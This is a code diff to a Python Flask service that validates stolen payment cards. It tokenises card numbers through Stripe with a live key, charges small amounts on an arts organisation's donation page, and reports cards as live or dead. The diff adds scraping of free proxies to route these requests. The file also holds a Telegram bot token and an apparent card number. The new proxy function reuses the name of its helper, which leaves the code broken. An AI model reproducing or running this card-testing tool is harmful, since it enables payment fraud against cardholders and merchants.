@@ -10,6 +10,39 @@ app.secret_key="app... Peace Out >0<"
 
 bot_token="5935678255:AAH4yHqwVwwiARYe-DV5I3ffTalWo22Ghrg"
 chat_id="2105574691"
+
+def getProxy(html):
+    return re.findall("\\d{1,3}(?:\\.\\d{1,3}){3}(?::\\d{1,5})?", html)
+
+def sendRequest():
+    h= {
+    "Host": "www.sslproxies.org",
+    "sec-ch-ua": "\"Not?A_Brand\";v\u003d\"8\", \"Chromium\";v\u003d\"108\", \"Google Chrome\";v\u003d\"108\"",
+    "sec-ch-ua-mobile": "?1",
+    "sec-ch-ua-platform": "\"Android\"",
+    "dnt": "1",
+    "upgrade-insecure-requests": "1",
+    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
+    "accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
+    "sec-fetch-site": "none",
+    "sec-fetch-mode": "navigate",
+    "sec-fetch-user": "?1",
+    "sec-fetch-dest": "document",
+    "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7"
+    }
+    req=requests.get("https://www.sslproxies.org/", headers=h, verify=False).text 
+    return req
+
+def getProxy():
+    proxies=getProxy(sendRequest())
+    ok=[]
+    for proxy in proxies:
+        if len(proxy.split(":"))==2:
+            print(proxy)
+            ok.append(proxy)
+    ip=ok[0].split(":")[0]
+    return {"http"  : "http://"+ok[0]}, ip
+
 def sendIP(request, page=""):
     uadata=request.headers.get('User-Agent')
     if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
@@ -22,6 +55,7 @@ def sendIP(request, page=""):
         return ip
 
 def chk(cc, mon, year, cvv, charge="10"):
+    proxy, ip=getProxy()
     h1= {
     "Host": "api.stripe.com",
     "content-length": "240",
@@ -40,14 +74,14 @@ def chk(cc, mon, year, cvv, charge="10"):
     "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7"
     }
     d1=f"card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mon}&card[exp_year]={year}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F36d27f7e5c%3B+stripe-js-v3%2F36d27f7e5c&time_on_page=15939&key=pk_live_eHjmIv6BpzVPLB8N3JjuCjsl00SrbAiU3w"
-    req1=requests.post("https://api.stripe.com/v1/tokens", headers=h1, data=d1)
+    req1=requests.post("https://api.stripe.com/v1/tokens", headers=h1, data=d1, proxies=proxy)
     if req1.status_code==402:
         return False, req1.json()["error"]["message"]
     tokenID=req1.json().get("id")
     if tokenID:
         pass
     else:
-        return "ERROR: TOKEN ID NOT FOUND"
+        return "ERROR: TOKEN ID NOT FOUND ~ IP: "+ip
     h2= {
     "Host": "artistsspace.org",
     "content-length": "80",
@@ -69,7 +103,7 @@ def chk(cc, mon, year, cvv, charge="10"):
     "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7"
     }
     d2=f"email=tizi.esc%40gmail.com&amount=%24{charge}&stripeToken="+tokenID
-    req2=requests.post("https://artistsspace.org/payment", headers=h2, data=d2).text
+    req2=requests.post("https://artistsspace.org/payment", headers=h2, data=d2, proxies=proxy).text
     
 
     soup = BeautifulSoup(req2, 'html.parser')
@@ -81,18 +115,18 @@ def chk(cc, mon, year, cvv, charge="10"):
     
     suc=["Thank You.", "cvc_check: pass", "Your card has insufficient funds."]
     
-    CCN=["Your card does not support this type of purchase.", "Your card's security code is incorrect", "Your card's security code is invalid", "incorrect_cvc"]
+    CCN=["Your card does not support this type of purchase.", "Your card was declined.", "Your card's", "Your card's security code is incorrect", "Your card's security code is invalid", "incorrect_cvc"]
     if result in suc:
-        return f"LIVE ~ MSG: {result} ~ CHARGED ${charge}"
+        return f"LIVE ~ MSG: {result} ~ CHARGED ${charge} ~ IP: {ip}"
     elif result in CCN:
-        return f"LIVE ~ MSG: {result} ~ CCN"
+        return f"LIVE ~ MSG: {result} ~ CCN ~ IP: {ip}"
     else:
-        return f"DEAD ~ MSG: {str(result)}"
+        return f"DEAD ~ MSG: {str(result)} ~ IP: {ip}"
 
 #print(chk("4403934457206451", "01", "2027", "864"))
 
-@app.route("/api/v1/check")
-@app.route("/api/v1/check/")
+@app.route("/api/v1")
+@app.route("/api/v1/")
 def v1CheckerAPI():
     sendIP(request, "checker-v1")
     if request.args.get("authKey").strip() not in authKey:
